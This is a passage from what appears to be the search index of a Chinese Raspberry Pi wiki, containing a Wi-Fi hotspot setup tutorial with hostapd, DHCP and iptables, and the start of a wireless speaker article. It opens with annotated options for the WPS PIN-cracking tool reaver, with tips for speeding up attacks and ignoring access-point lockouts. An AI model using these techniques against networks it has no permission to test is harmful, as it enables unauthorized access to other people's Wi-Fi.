\u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528 -e, --essid= ESSID of the target AP \u8def\u7531\u5668\u7684ESSID\uff0c\u4e00\u822c\u4e0d\u7528\u6307\u5b9a -c, --channel= Set the 802.11 channel for the interface (implies -f) \u4fe1\u53f7\u7684\u9891\u9053\uff0c\u5982\u679c\u4e0d\u6307\u5b9a\u4f1a\u81ea\u52a8\u626b\u63cf -o, --out-file= Send output to a log file [stdout] \u6807\u51c6\u8f93\u51fa\u5230\u6587\u4ef6 -s, --session= Restore a previous session file \u6062\u590d\u8fdb\u7a0b\u6587\u4ef6 -C, --exec= Execute the supplied command upon successful pin recovery pin\u6210\u529f\u540e\u6267\u884c\u547d\u4ee4 -D, --daemonize Daemonize reaver \u8bbe\u7f6ereaver\u6210Daemon -a, --auto Auto detect the best advanced options for the target AP \u5bf9\u76ee\u6807AP\u81ea\u52a8\u68c0\u6d4b\u9ad8\u7ea7\u53c2\u6570 -f, --fixed Disable channel hopping \u7981\u6b62\u9891\u9053\u8df3\u8f6c -5, --5ghz Use 5GHz 802.11 channels \u4f7f\u75285G\u9891\u9053 -v, --verbose Display non-critical warnings (-vv for more) \u663e\u793a\u4e0d\u91cd\u8981\u8b66\u544a\u4fe1\u606f -vv \u53ef\u4ee5\u663e\u793a\u66f4\u591a -q, --quiet Only display critical messages \u53ea\u663e\u793a\u5173\u952e\u4fe1\u606f -h, --help Show help \u663e\u793a\u5e2e\u52a9 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a \u9ad8\u7ea7\u53c2\u6570: -p, --pin= Use the specified 4 or 8 digit WPS pin \u76f4\u63a5\u8bfb\u53d6psk\uff08\u672c\u4eba\u6d4b\u8bd5\u672a\u6210\u529f\uff0c\u5efa\u8bae\u7528\u7f51\u5361\u81ea\u5e26\u8f6f\u4ef6\u83b7\u53d6\uff09 -d, --delay= Set the delay between pin attempts 1 pin\u95f4\u5ef6\u65f6\uff0c\u9ed8\u8ba41\u79d2\uff0c\u63a8\u8350\u8bbe0 -l, --lock-delay= Set the time to wait if the AP locks WPS pin attempts [60] AP\u9501\u5b9aWPS\u540e\u7b49\u5f85\u65f6\u95f4 -g, --max-attempts= Quit after num pin attempts \u6700\u5927pin\u6b21\u6570 -x, --fail-wait= Set the time to sleep after 10 unexpected failures [0] 10\u6b21\u610f\u5916\u5931\u8d25\u540e\u7b49\u5f85\u65f6\u95f4\uff0c\u9ed8\u8ba40\u79d2 -r, --recurring-delay= Sleep for y seconds every x pin attempts \u6bcfx\u6b21pin\u540e\u7b49\u5f85y\u79d2 -t, --timeout= Set the receive timeout period [5] \u6536\u5305\u8d85\u65f6\uff0c\u9ed8\u8ba45\u79d2 -T, --m57-timeout= Set the M5/M7 timeout period [0.20] M5/M7\u8d85\u65f6\uff0c\u9ed8\u8ba40.2\u79d2 -A, --no-associate Do not associate with the AP (association must be done by another application) \u4e0d\u8fde\u5165AP\uff08\u8fde\u5165\u8fc7\u7a0b\u5fc5\u987b\u6709\u5176\u4ed6\u7a0b\u5e8f\u5b8c\u6210\uff09 -N, --no-nacks Do not send NACK messages when out of order packets are received \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -S, --dh-small Use small DH keys to improve crack speed \u4f7f\u7528\u5c0fDH\u5173\u952e\u503c\u63d0\u9ad8\u901f\u5ea6\uff08\u63a8\u8350\u4f7f\u7528\uff09 -L, --ignore-locks Ignore locked state reported by the target AP \u5ffd\u7565\u76ee\u6807AP\u62a5\u544a\u7684\u9501\u5b9a\u72b6\u6001 -E, --eap-terminate Terminate each WPS session with an EAP FAIL packet \u6bcf\u5f53\u6536\u5230EAP\u5931\u8d25\u5305\u5c31\u7ec8\u6b62WPS\u8fdb\u7a0b -n, --nack Target AP always sends a NACK [Auto] \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -w, --win7 Mimic a Windows 7 registrar [False] \u6a21\u62dfwin7\u6ce8\u518c\uff0c\u9ed8\u8ba4\u5173\u95ed","title":"\u5c0f\u7ed3-PJ\u65f6\u5e94\u56e0\u72b6\u51b5\u8c03\u6574\u53c2\u6570:"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#reference","text":"http://lok.me/a/1972.html http://bao3.blogspot.com/2013/05/raspberry-pi.html http://tieba.baidu.com/p/2682878857 http://www.nyaboron.moe/posts/606.html \u6587\u7ae0\u7248\u6743\u5f52 FindHao \u6240\u6709\u4e28\u672c\u7ad9\u9ed8\u8ba4\u91c7\u7528CC-BY-NC-SA 4.0\u534f\u8bae\u8fdb\u884c\u6388\u6743| \u8f6c\u8f7d\u5fc5\u987b\u5305\u542b\u672c\u58f0\u660e\uff0c\u5e76\u4ee5\u8d85\u94fe\u63a5\u5f62\u5f0f\u6ce8\u660e\u4f5c\u8005 FindHao \u548c\u672c\u6587\u539f\u59cb\u5730\u5740\uff1a https://www.findhao.net/easycoding/1184.html","title":"Reference"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/","text":"\u6811\u8393\u6d3e\u5f00\u53d1\u7cfb\u5217\u6559\u7a0b6\u2014\u2014\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9_\u8001\u5f902014-CSDN\u535a\u5ba2_\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9 \u539f\u7406\uff1aPi\u4f7f\u7528\u6709\u7ebf\u8fde\u5165\u7f51\u7edc\uff0c\u7136\u540e\u63a5USB\u65e0\u7ebf\u7f51\u5361\u4f5c\u4e3a\u70ed\u70b9\uff0c\u63d0\u4f9bWifi\u63a5\u5165\u3002 1\u3001USB\u65e0\u7ebf\u7f51\u5361\u9a71\u52a8 \u5982\u679c\u63a5\u4e0aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u4f7f\u7528ifconfig\u547d\u4ee4\uff0c\u80fd\u76f4\u63a5\u770b\u5230wlan0\uff0c\u90a3\u4e48\u606d\u559c\u4f60\uff0c\u53ef\u4ee5\u76f4\u63a5\u8df3\u8fc7\u8fd9\u4e00\u6b65\u3002 \u5982\u679c\u6ca1\u6709\u8bf7\u67e5\u8be2\u4e00\u4e0b\u6811\u8393\u6d3e\u652f\u6301\u7684USB\u65e0\u7ebf\u7f51\u5361\u578b\u53f7\uff0c\u53ef\u53c2\u8003\u4ee5\u4e0b\u7f51\u5740\uff1a http://elinux.org/RPi_VerifiedPeripherals#USB_Wi-Fi_Adapters 2\u3001\u4fee\u6539wlan0\u4e3a\u9759\u6001IP *\u76f8\u5f53\u4e8e\u8bbe\u7f6e\u8def\u7531\u5668lan\u53e3IP,\u5373\u6211\u4eec\u8bbf\u95ee\u8def\u7531\u5668\u901a\u5e38\u4f7f\u7528\u7684:192.168.1.1 * sudo vim /etc/network/interfaces \u628a\u539f\u6765\u5173\u4e8ewlan0\u7684\u6ce8\u91ca\u6389\uff1a \uff08\u53ef\u80fd\u8ddf\u8fd9\u4e2a\u4e0d\u4e00\u6837\uff0c\u8ddfwlan0\u6709\u5173\u7684\u6ce8\u91ca\u6389\u5373\u53ef\uff09 auto wlan0 #iface wlan0 inet dhcp #wpa-ssid \"360WiFi-li\" #wpa-psk \"xiaolizi\" \u6dfb\u52a0\u4e0b\u9762\u7684\uff1a iface wlan0 inet static address 192.168.0.1 netmask 255.255.255.0 gateway 192.168.0.1 \u5b8c\u6210\u4e4b\u540e\u9700\u8981\u91cd\u542f 3\u3001\u5b89\u88c5hostapd *\u5b98\u65b9\u7684hostapd\u4e0d\u652f\u63018188CUS\uff0c\u540e\u9762\u9700\u8981\u91cd\u65b0\u5378\u8f7d\u5b89\u88c5\u65b0\u7684 * *\u7b14\u8005\u6d4b\u8bd5\u8c8c\u4f3c\u8fd9\u91cc\u5fc5\u987b\u5148\u88c5\u65e7\u7684\uff0c\u7136\u540e\u540e\u9762\u5378\u4e86\u88c5\u65b0\u7684\uff0c\u5426\u5219\u4e5f\u4e0d\u80fd\u7528 * sudo apt-get install hostapd 1\uff09\u7f16\u8f91hostapd \u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/default/hostapd \u627e\u5230#DAEMON_CONF= \"\"\uff0c\u4fee\u6539\u4e3a\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 2\uff09\u7136\u540e\u7f16\u8f91\uff1asudo vim /etc/hostapd/hostapd.conf \u589e\u52a0\u4ee5\u4e0b\u4ee3\u7801\uff1a # Basic configuration interface=wlan0 ssid=raspberrywifi channel=1 #bridge=br0 # WPA and WPA2 configuration macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=3 wpa_passphrase=12345678 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP # Hardware configuration driver=rtl871xdrv ieee80211n=1 hw_mode=g device_name=RTL8192CU manufacturer=Realtek \u4fee\u6539wifi\u540d\u548c\u5bc6\u7801 ssid=raspberrywifi wpa_passphrase=12345678 3\uff09\u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u91cd\u542f\u670d\u52a1\uff1a sudo service hostapd restart \u6216\u8005\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u751f\u6548 sudo hostapd -dd /etc/hostapd/hostapd.conf 4\uff09\u5982\u679c\u4f60\u4f7f\u7528\u7684\u7f51\u5361\u63d0\u793a\u4e00\u4e0b\u4fe1\u606f Configuration file: /etc/hostapd/hostapd.conf nl80211: 'nl80211' generic netlink not found Failed to initialize driver 'nl80211' rmdir[ctrl_interface]: No such file or directory \u90a3\u4e48\uff0c\u8fd8\u662f\u8981\u4f7f\u7528\u7b2c\u4e09\u65b9\u7684hostapd\u3002 4\u3001\u5b89\u88c5\u65b0\u7684hostapd 1)\u5220\u9664\u539f\u6765\u7684hostapd\uff08\u7b14\u8005\u6d4b\u8bd5\uff0c\u4e0d\u5378\u8f7d\u8c8c\u4f3c\u4e5f\u884c\uff09 sudo apt-get autoremove hostapd 2)\u4e0b\u8f7d\u7b2c\u4e09\u65b9\u9a71\u52a8\u5e76\u5b89\u88c5 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v1.1.tar.gz tar -zxvf v1.1.tar.gz 3)\u7f16\u8bd1\uff1a cd RTL8188-hostapd-1.1/hostapd sudo make sudo make install 4)\u7136\u540e\u518d\u91cd\u542f\u670d\u52a1\uff0c\u5e94\u8be5\u63d0\u793a\u6210\u529f\uff1a $ sudo service hostapd restart [ ok ] Stopping advanced IEEE 802.11 management: hostapd. [ ok ] Starting advanced IEEE 802.11 management: hostapd. 5)\u5c06hostapd\u52a0\u5165\u5f00\u673a\u81ea\u542f\u52a8 *sudo service hostapd start * sudo update-rc.d hostapd enable \u7b14\u8005\u8fd9\u91cc\u63d0\u793a\u7684\u8fd8\u662f\u5931\u8d25\uff0c\u4f46\u662f\u91cd\u542f\u540e\u7f51\u7edc\u786e\u5b9e\u5efa\u7acb\u6210\u529f\uff0c\u7528\u624b\u673a\u53ef\u4ee5\u641c\u5230\u8fd9\u4e2a\u7f51\u7edc 5\u3001\u5b89\u88c5DHCP\u670d\u52a1 \u4ee5\u4e0a\u6b65\u9aa4\u5efa\u7acb\u8d77\u4e86wifi\u70ed\u70b9\uff0c\u4f46\u662f\u65e0\u6cd5\u81ea\u52a8\u83b7\u53d6ip\uff0c\u9700\u8981\u4ee5\u4e0b\u6b65\u9aa4 sudo apt-get install udhcpd 1)\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/udhcpd.conf //\u4fee\u6539\u4ee5\u4e0b\u4fe1\u606f\uff0cstart\u548cend\u662f\u91cd\u70b9\uff0c\u6ce8\u610f\u8ddf\u7b2c\u4e00\u6b65\u7684\u9759\u6001ip\u5728\u4e00\u4e2a\u7f51\u6bb5 start 192.168.0.20 end 192.168.0.200 interface wlan0 2)\u63a5\u4e0b\u6765\u7f16\u8f91/etc/default/udhcpd\u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 3)\u542f\u52a8dhcp\u670d\u52a1\u5668 *sudo service udhcpd start * sudo update-rc.d udhcpd enable \u7ecf\u8fc7\u6b64\u6b65\u624b\u673a\u5df2\u7ecf\u53ef\u4ee5\u63a5\u5165wifi\u7f51\u7edc\uff0c\u5e76\u4e14\u81ea\u52a8\u83b7\u53d6ip 6\u3001\u914d\u7f6e\u8def\u7531\u8f6c\u53d1 \u7406\u8bba\u4e0a\u662f\u7ecf\u8fc7\u8fd9\u4e00\u6b65\uff0c\u624b\u673a\u53ef\u4ee5\u901a\u8fc7\u5171\u4eab\u6811\u8393\u6d3e\u7684\u65e0\u7ebf\u7f51\u7edc\u4e0a\u7f51\u4e86\uff0c\u4f46\u662f\u7b14\u8005\u4e00\u76f4\u6ca1\u6709\u6210\u529f 1)\u8bbe\u7f6e\u8def\u7531\u6620\u5c04\u89c4\u5219 sudo iptables -F sudo iptables -X sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT sudo bash -c iptables-save > /etc/iptables.up.rules 2)\u7f16\u8f91\uff1asudo vim /etc/network/if-pre-up.d/iptables \u6dfb\u52a0\u4e0b\u9762\u4e24\u884c\u4ee3\u7801\uff1a #!/bin/bash /sbin/iptables-restore < /etc/iptables.up.rules \u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u4fee\u6539iptables\u6743\u9650\uff1a sudo chmod 755 /etc/network/if-pre-up.d/iptables 4)\u5f00\u8d77\u5185\u6838\u8f6c\u53d1\uff1a sudo vim /etc/sysctl.conf \u627e\u5230\u4e0b\u9762\u4e24\u884c\uff1a #Uncomment the next line to enable packet forwarding for IPv4 #net.ipv4.ip_forward=1 \u628anet.ipv4.ip_forward \u524d\u9762\u7684#\u53bb\u6389\uff0c\u4fdd\u5b58\u9000\u51fa\u3002 \u7136\u540e :sudo sysctl -p 7\u3001\u5176\u5b83\u95ee\u9898 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5c06/etc/default/ifplugd\u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/xdw1985829/article/details/38845533","title":"\u6811\u8393\u6d3e\u5f00\u53d1\u7cfb\u5217\u6559\u7a0b6\u2014\u2014\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9 \u8001\u5f902014 CSDN\u535a\u5ba2 \u6811\u8393\u6d3e\u505awifi\u70ed\u70b9"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/#6wifi_2014-csdn_wifi","text":"\u539f\u7406\uff1aPi\u4f7f\u7528\u6709\u7ebf\u8fde\u5165\u7f51\u7edc\uff0c\u7136\u540e\u63a5USB\u65e0\u7ebf\u7f51\u5361\u4f5c\u4e3a\u70ed\u70b9\uff0c\u63d0\u4f9bWifi\u63a5\u5165\u3002 1\u3001USB\u65e0\u7ebf\u7f51\u5361\u9a71\u52a8 \u5982\u679c\u63a5\u4e0aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u4f7f\u7528ifconfig\u547d\u4ee4\uff0c\u80fd\u76f4\u63a5\u770b\u5230wlan0\uff0c\u90a3\u4e48\u606d\u559c\u4f60\uff0c\u53ef\u4ee5\u76f4\u63a5\u8df3\u8fc7\u8fd9\u4e00\u6b65\u3002 \u5982\u679c\u6ca1\u6709\u8bf7\u67e5\u8be2\u4e00\u4e0b\u6811\u8393\u6d3e\u652f\u6301\u7684USB\u65e0\u7ebf\u7f51\u5361\u578b\u53f7\uff0c\u53ef\u53c2\u8003\u4ee5\u4e0b\u7f51\u5740\uff1a http://elinux.org/RPi_VerifiedPeripherals#USB_Wi-Fi_Adapters 2\u3001\u4fee\u6539wlan0\u4e3a\u9759\u6001IP *\u76f8\u5f53\u4e8e\u8bbe\u7f6e\u8def\u7531\u5668lan\u53e3IP,\u5373\u6211\u4eec\u8bbf\u95ee\u8def\u7531\u5668\u901a\u5e38\u4f7f\u7528\u7684:192.168.1.1 * sudo vim /etc/network/interfaces \u628a\u539f\u6765\u5173\u4e8ewlan0\u7684\u6ce8\u91ca\u6389\uff1a \uff08\u53ef\u80fd\u8ddf\u8fd9\u4e2a\u4e0d\u4e00\u6837\uff0c\u8ddfwlan0\u6709\u5173\u7684\u6ce8\u91ca\u6389\u5373\u53ef\uff09","title":"\u6811\u8393\u6d3e\u5f00\u53d1\u7cfb\u5217\u6559\u7a0b6\u2014\u2014\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9_\u8001\u5f902014-CSDN\u535a\u5ba2_\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/#auto-wlan0","text":"#iface wlan0 inet dhcp #wpa-ssid \"360WiFi-li\" #wpa-psk \"xiaolizi\" \u6dfb\u52a0\u4e0b\u9762\u7684\uff1a iface wlan0 inet static address 192.168.0.1 netmask 255.255.255.0 gateway 192.168.0.1 \u5b8c\u6210\u4e4b\u540e\u9700\u8981\u91cd\u542f 3\u3001\u5b89\u88c5hostapd *\u5b98\u65b9\u7684hostapd\u4e0d\u652f\u63018188CUS\uff0c\u540e\u9762\u9700\u8981\u91cd\u65b0\u5378\u8f7d\u5b89\u88c5\u65b0\u7684 * *\u7b14\u8005\u6d4b\u8bd5\u8c8c\u4f3c\u8fd9\u91cc\u5fc5\u987b\u5148\u88c5\u65e7\u7684\uff0c\u7136\u540e\u540e\u9762\u5378\u4e86\u88c5\u65b0\u7684\uff0c\u5426\u5219\u4e5f\u4e0d\u80fd\u7528 * sudo apt-get install hostapd 1\uff09\u7f16\u8f91hostapd \u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/default/hostapd \u627e\u5230#DAEMON_CONF= \"\"\uff0c\u4fee\u6539\u4e3a\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 2\uff09\u7136\u540e\u7f16\u8f91\uff1asudo vim /etc/hostapd/hostapd.conf \u589e\u52a0\u4ee5\u4e0b\u4ee3\u7801\uff1a # Basic configuration interface=wlan0 ssid=raspberrywifi channel=1 #bridge=br0 # WPA and WPA2 configuration macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=3 wpa_passphrase=12345678 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP # Hardware configuration driver=rtl871xdrv ieee80211n=1 hw_mode=g device_name=RTL8192CU manufacturer=Realtek \u4fee\u6539wifi\u540d\u548c\u5bc6\u7801 ssid=raspberrywifi wpa_passphrase=12345678 3\uff09\u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u91cd\u542f\u670d\u52a1\uff1a sudo service hostapd restart \u6216\u8005\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u751f\u6548 sudo hostapd -dd /etc/hostapd/hostapd.conf 4\uff09\u5982\u679c\u4f60\u4f7f\u7528\u7684\u7f51\u5361\u63d0\u793a\u4e00\u4e0b\u4fe1\u606f Configuration file: /etc/hostapd/hostapd.conf nl80211: 'nl80211' generic netlink not found Failed to initialize driver 'nl80211' rmdir[ctrl_interface]: No such file or directory \u90a3\u4e48\uff0c\u8fd8\u662f\u8981\u4f7f\u7528\u7b2c\u4e09\u65b9\u7684hostapd\u3002 4\u3001\u5b89\u88c5\u65b0\u7684hostapd 1)\u5220\u9664\u539f\u6765\u7684hostapd\uff08\u7b14\u8005\u6d4b\u8bd5\uff0c\u4e0d\u5378\u8f7d\u8c8c\u4f3c\u4e5f\u884c\uff09 sudo apt-get autoremove hostapd 2)\u4e0b\u8f7d\u7b2c\u4e09\u65b9\u9a71\u52a8\u5e76\u5b89\u88c5 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v1.1.tar.gz tar -zxvf v1.1.tar.gz 3)\u7f16\u8bd1\uff1a cd RTL8188-hostapd-1.1/hostapd sudo make sudo make install 4)\u7136\u540e\u518d\u91cd\u542f\u670d\u52a1\uff0c\u5e94\u8be5\u63d0\u793a\u6210\u529f\uff1a $ sudo service hostapd restart [ ok ] Stopping advanced IEEE 802.11 management: hostapd. [ ok ] Starting advanced IEEE 802.11 management: hostapd. 5)\u5c06hostapd\u52a0\u5165\u5f00\u673a\u81ea\u542f\u52a8 *sudo service hostapd start * sudo update-rc.d hostapd enable \u7b14\u8005\u8fd9\u91cc\u63d0\u793a\u7684\u8fd8\u662f\u5931\u8d25\uff0c\u4f46\u662f\u91cd\u542f\u540e\u7f51\u7edc\u786e\u5b9e\u5efa\u7acb\u6210\u529f\uff0c\u7528\u624b\u673a\u53ef\u4ee5\u641c\u5230\u8fd9\u4e2a\u7f51\u7edc 5\u3001\u5b89\u88c5DHCP\u670d\u52a1 \u4ee5\u4e0a\u6b65\u9aa4\u5efa\u7acb\u8d77\u4e86wifi\u70ed\u70b9\uff0c\u4f46\u662f\u65e0\u6cd5\u81ea\u52a8\u83b7\u53d6ip\uff0c\u9700\u8981\u4ee5\u4e0b\u6b65\u9aa4 sudo apt-get install udhcpd 1)\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/udhcpd.conf //\u4fee\u6539\u4ee5\u4e0b\u4fe1\u606f\uff0cstart\u548cend\u662f\u91cd\u70b9\uff0c\u6ce8\u610f\u8ddf\u7b2c\u4e00\u6b65\u7684\u9759\u6001ip\u5728\u4e00\u4e2a\u7f51\u6bb5 start 192.168.0.20 end 192.168.0.200 interface wlan0 2)\u63a5\u4e0b\u6765\u7f16\u8f91/etc/default/udhcpd\u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 3)\u542f\u52a8dhcp\u670d\u52a1\u5668 *sudo service udhcpd start * sudo update-rc.d udhcpd enable \u7ecf\u8fc7\u6b64\u6b65\u624b\u673a\u5df2\u7ecf\u53ef\u4ee5\u63a5\u5165wifi\u7f51\u7edc\uff0c\u5e76\u4e14\u81ea\u52a8\u83b7\u53d6ip 6\u3001\u914d\u7f6e\u8def\u7531\u8f6c\u53d1 \u7406\u8bba\u4e0a\u662f\u7ecf\u8fc7\u8fd9\u4e00\u6b65\uff0c\u624b\u673a\u53ef\u4ee5\u901a\u8fc7\u5171\u4eab\u6811\u8393\u6d3e\u7684\u65e0\u7ebf\u7f51\u7edc\u4e0a\u7f51\u4e86\uff0c\u4f46\u662f\u7b14\u8005\u4e00\u76f4\u6ca1\u6709\u6210\u529f 1)\u8bbe\u7f6e\u8def\u7531\u6620\u5c04\u89c4\u5219 sudo iptables -F sudo iptables -X sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT sudo bash -c iptables-save > /etc/iptables.up.rules 2)\u7f16\u8f91\uff1asudo vim /etc/network/if-pre-up.d/iptables \u6dfb\u52a0\u4e0b\u9762\u4e24\u884c\u4ee3\u7801\uff1a #!/bin/bash /sbin/iptables-restore < /etc/iptables.up.rules \u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u4fee\u6539iptables\u6743\u9650\uff1a sudo chmod 755 /etc/network/if-pre-up.d/iptables 4)\u5f00\u8d77\u5185\u6838\u8f6c\u53d1\uff1a sudo vim /etc/sysctl.conf \u627e\u5230\u4e0b\u9762\u4e24\u884c\uff1a #Uncomment the next line to enable packet forwarding for IPv4 #net.ipv4.ip_forward=1 \u628anet.ipv4.ip_forward \u524d\u9762\u7684#\u53bb\u6389\uff0c\u4fdd\u5b58\u9000\u51fa\u3002 \u7136\u540e :sudo sysctl -p 7\u3001\u5176\u5b83\u95ee\u9898 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5c06/etc/default/ifplugd\u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/xdw1985829/article/details/38845533","title":"auto wlan0"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/","text":"\u6811\u8393\u6d3e\u9999\u6a59\u6d3e\u65e0\u7ebf\u64ad\u653e\uff0c\u5b9e\u73b0DLNA\u4e0eAirPlay\u534f\u8bae\u65e0\u7ebf\u97f3\u7bb1 \u6539\u9020\u6811\u8393\u6d3e\u3001\u9999\u6a59\u6d3e\u6447\u8eab\u4e00\u53d8\u65e0\u7ebfWIFI\u97f3\u54cd\u5728\u7ebf\u64ad\u653e\uff0c\u65e0\u9700\u5b89\u88c5XBMC\u8fd9\u4e2a\u5e9e\u7136\u5927\u7269\u4e5f\u80fd\u5b9e\u73b0DLNA\u548cAirPlay\u53cc\u534f\u8bae\u7684WIFI\u97f3\u54cd\uff0cDLNA \u5b9e\u73b0\u4e8eGmrender-resurrect\u9879\u76ee\u3001AirPlay\u5b9e\u73b0\u4e8eShairport\u9879\u76ee \u51c6\u5907\u5de5\u4f5c \u62ff\u51fa\u4f60\u653e\u5728\u89d2\u843d\u91cc\u79ef\u7070\u7684\u6811\u8393\u6d3e\uff0c\u626b\u626b\u7070\u5c18\uff0c\u5fc5\u8981\u7684\u65f6\u5019\u518d\u629a\u6478\u5b89\u6170\u4e00\u4e0b\uff1f\uff01\u54c8\u54c8\u54c8 \u9009\u8d2d\u4e00\u4e2a\u964d\u566a\u7684USB\u58f0\u5361\uff0c\u6811\u8393\u6d3e\u7684\u58f0\u566a\u6709\u70b9\u60e8\u4e0d\u5fcd\u7779 \u9009\u8d2d\u4e00\u4e2a\u5e72\u6270\u4f4e\u7684\u7535\u6e90\u7ed9\u6811\u8393\u6d3e\u4f9b\u7535 \u9009\u8d2d\u4e00\u4e2a\u597d\u70b9\u7684\u97f3\u54cd\u5e76\u8fde\u63a5\u5230\u6811\u8393\u6d3e 